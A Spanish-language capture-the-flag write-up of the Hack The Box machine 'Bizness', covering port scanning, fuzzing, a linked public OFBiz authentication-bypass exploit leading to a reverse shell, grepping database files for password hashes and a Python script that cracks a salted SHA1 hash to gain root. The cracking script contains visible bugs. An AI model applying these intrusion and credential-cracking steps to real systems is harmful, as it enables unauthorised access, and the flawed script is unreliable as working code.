---
title: HTB Bizness Writeup
date: 2024-05-25 08:00:00 -05:00
author: retxus
categories: [HTB, Linux]
tags: [Linux, https, OFBiz, Deserialzation, RCE pre-auth]
comments: false
image:
  path: /assets/img/HTB-Bizness/Bizness.png
---

Muy buenas con todos, el día de hoy voy a resolver la máquina `Bizness` de HTB, espero que el procedimiento sea de su agrado y fácil de comprender.

## Reconocimiento

Primero vemos si tenemos conexión con la máquina y de paso gracias al `ttl` identificamos ante el tipo de máquina que estamos, en `linux` este suele ser de 64 y en `windows` de 128.

```bash
ping -c 1 10.10.11.252
PING 10.10.11.252 (10.10.11.252) 56(84) bytes of data.
64 bytes from 10.10.11.252: icmp_seq=1 ttl=63 time=95.2 ms

--- 10.10.11.252 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 95.228/95.228/95.228/0.000 ms
```

Vemos que el `ttl` de la máquina es de 63, el cual está próximo a 64 por ende nos encontramos ante una máquina `Linux`.

Ahora, con la herramienta `nmap` lanzamos un escaneo en donde vamos a enumerar los puertos que se encuentran abiertos en la máquina.

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.252 -oG ports
```

Aquí generamos un archivo en formato grepeable y hacemos uso de la función <a href="https://gist.github.com/anibalardid/5e05b6472feb3d31116729dc24e6d3e2">extarctPorts</a> de <a href="https://s4vitar.github.io/">s4vitar</a>.

```bash
extractPorts ports
```

Ahora con el número de los puertos copiados en el portapapeles, lanzamos otro escaneo para enumerar el servicio que corren por los puertos.

```bash
nmap -sCV -p22,80,443,37607 10.10.11.252 -oN target
```

Aquí generamos un archivo en el formato normal de `nmap` en donde se nos muestra más infomación de los servicios que corren por esos puertos.

```bash
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp    open  http       nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp   open  ssl/http   nginx 1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
| tls-nextprotoneg: 
|_  http/1.1
| tls-alpn: 
|_  http/1.1
|_http-server-header: nginx/1.18.0
37607/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Vemos que se nos refleja un dominio, así que lo agregamos al `/etc/hosts`, para que la máquina sepa a donde resolver.

```bash
127.0.0.1	localhost
::1		localhost
127.0.0.1	machinename.localhost	machinename

10.10.11.252 bizness.htb
```

Nos dirigimos al navegador y vemos que nos redirige a `https`, luego fuzeando un poco con wfuzz.
```bash
wfuzz -c -t 50 --hc=404 -w diccionario.txt -u https://bizness.htb/FUZZ/
```

### Explotación de OFBiz RCE pre-auth

Vemos que nos encuentra una ruta `control` y sobre esa ruta volvemos a fuzzear y nos encuentra `login`. Allí nos sale un panel de auntenticación llamado `OFBiz`, pero no tenemos ninguna credencial, en la parte de abajo de la web nos sale lo que parece ser una verisón así que buscamos alguna vulnerabilidad asociada y nos encontramos con en siguiente <a href="https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass">exploit</a>, donde nos explican como es la vulnerabilidad y de que trata.

Procedemos a clonar el repositorio y a entablar una revshel.
![](/assets/img/HTB-Bizness/1_Bizness.png)

Luego hacemos el tratamiento de la `tty`

```bash
script /dev/null -c bash
ctrl + z
stty raw -echo; fg
reset xterm
export TEMR=xterm
```
Y podemos ver la flag del usuario.

## Escalada de privilegios

Luego de enumerar, vemos que en la ruta `/opt/ofbiz/runtime/data/derby/ofbiz/seg0` nos encontramos con algunos archivos `.dat` que podrían contener datos interesantes, con la siguiente `regex` buscamos algo que nos interese.

```bash
grep -arin -o -E '(\w+\W+){0,5}password(\W+\w+){0,5}' .
```

Vemos que hay un hash con un formato un tanto extraño, así que con el siguiente script vamos a tratar de descifrarlo.

![](/assets/img/HTB-Bizness/2_Bizness.png)

```bash
#!/usr/bin/bash3

import hashlib
import base64
import os

def cryptBytes(hash_type, salt, value):
    if not hash_type:
        hash_type = "SHA"
    if not salt:
        salt = base64.urlsafe_b64encode(oss.urandom(16)).decode('utf-8')
    hash_obj = hashlib.new(hash_type)
    hash_obj.update(salt.encode('utf-8'))
    hash_obj.update(value)
    hashed_bytes = hash_obj.digest()
    result = f"${hash_type}${salt}${base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')}"
    return result
def getDecryptedBytes(hash_type, salt, value):
    try:
        hash_obj = hashlib.new(hash_type)
        hash_obj.update(salt.encode('utf-8'))
        hash_obj.update(value)
        hashed_bytes = hash_obj.digest()
        return base64.urlsafe_b64encode(hashed_bytes).decode('utf-8').replace('+', '.')
    except hashlib.NoSuchAlgorithmException as e:
        raise Exception(f"Error while computng hash of type {hash_type}: {e}")
hash_type = "SHA1"
salt = "d"
search = "$SHA1$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I="
wordlist = 'rockyou.txt'
with open(wordlist, 'r', encoding="latin-1") as password_list:
    for password in password_list:
        value = password.strip()
        hashed_password = cryptBytes(hash_type, salt, value.encode('utf-8'))

        if hashed_password == search:
            print(f'Found password:{value}, hash:{hashed_password}')
            break
```

![](/assets/img/HTB-Bizness/3_Bizness.png)

Una vez obtenida la contraseña probamos con el usuario root y vemos que funciona y ahora ya tenemos podemos ver la root.txt
